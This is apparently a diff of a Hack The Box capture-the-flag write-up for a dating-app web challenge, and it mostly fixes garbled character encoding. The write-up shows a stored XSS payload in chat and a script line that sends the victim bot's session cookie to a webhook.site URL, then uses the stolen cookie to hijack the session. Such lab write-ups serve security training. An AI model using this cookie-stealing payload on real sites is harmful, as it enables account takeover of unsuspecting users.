@@ -26,7 +26,7 @@ OnlyHacks is a dating-app themed web challenge where the chat feature is vulnera
 
 ## Skills Learned
 
-- Identifying the â€œvictimâ€ browser by request metadata (referer/IP/user-agent)
+- Identifying the “victim” browser by request metadata (referer/IP/user-agent)
 - Avoiding self-trigger confusion (attacker vs bot requests)
 
 ---
@@ -64,7 +64,7 @@ Matching with users unlocks chat. The interesting match here is **Renata**, whic
 ---
 ## Solution
 
-### Step 1 â€“ Confirm stored XSS in chat
+### Step 1 – Confirm stored XSS in chat
 
 We first verify if chat messages are reflected/stored without sanitization by sending a simple `<script>alert(0)</script>` payload.
 
@@ -81,15 +81,15 @@ Renata responds with a warning message (flavor text); it does not prevent execut
 ![evidence](screenshots/onlyhacks_06_renata_warning.png)
 
 ---
-### Step 2 â€“ Exfiltrate Renataâ€™s `session` cookie to a webhook
+### Step 2 – Exfiltrate Renata’s `session` cookie to a webhook
 
-To hijack the victim session, we send a payload that appends `document.cookie` to our webhook URL. This will trigger twice: once in our own browser (when we view the chat), and once in Renataâ€™s bot browser.
+To hijack the victim session, we send a payload that appends `document.cookie` to our webhook URL. This will trigger twice: once in our own browser (when we view the chat), and once in Renata’s bot browser.
 
 ```html
 <script>new Image().src='https://webhook.site/<YOUR-ID>/?c='+document.cookie</script>
 ```
 
-After sending the payload and refreshing the webhook inbox, we observe two GET requests. The one corresponding to Renataâ€™s bot can be identified by metadata such as a localhost referer (the server rendering the app internally).
+After sending the payload and refreshing the webhook inbox, we observe two GET requests. The one corresponding to Renata’s bot can be identified by metadata such as a localhost referer (the server rendering the app internally).
 
 ![evidence](screenshots/onlyhacks_07_webhook_cookie.png)
 
@@ -98,25 +98,25 @@ The sent payloads are visible in the chat history.
 ![evidence](screenshots/onlyhacks_08_payloads_sent.png)
 
 ---
-### Step 3 â€“ Hijack Renataâ€™s session and retrieve the flag
+### Step 3 – Hijack Renata’s session and retrieve the flag
 
-With Renataâ€™s `session` value, we replace our browserâ€™s cookie:
+With Renata’s `session` value, we replace our browser’s cookie:
 
-- Open DevTools â†’ **Application** â†’ **Cookies** â†’ `http://154.57.164.61:30324`
-- Replace the `session` cookie value with Renataâ€™s exfiltrated value
+- Open DevTools → **Application** → **Cookies** → `http://154.57.164.61:30324`
+- Replace the `session` cookie value with Renata’s exfiltrated value
 - Refresh the page to browse as Renata
 
-The flag is then accessible in Renataâ€™s chat list (with Dimitris).
+The flag is then accessible in Renata’s chat list (with Dimitris).
 
 ![[onlyhacks_09_flag_leak.png]]
 
-ðŸ **Flag obtained:** `HTB{REDACTED}`
+🏁 **Flag obtained:** `HTB{REDACTED}`
 
 ---
 ## Summary
 
 1. Confirmed **stored XSS** in the chat message renderer.
-2. Exfiltrated the botâ€™s `session` cookie via webhook request.
+2. Exfiltrated the bot’s `session` cookie via webhook request.
 3. Replaced local cookie to hijack the bot session and read the flag.
 
 ---
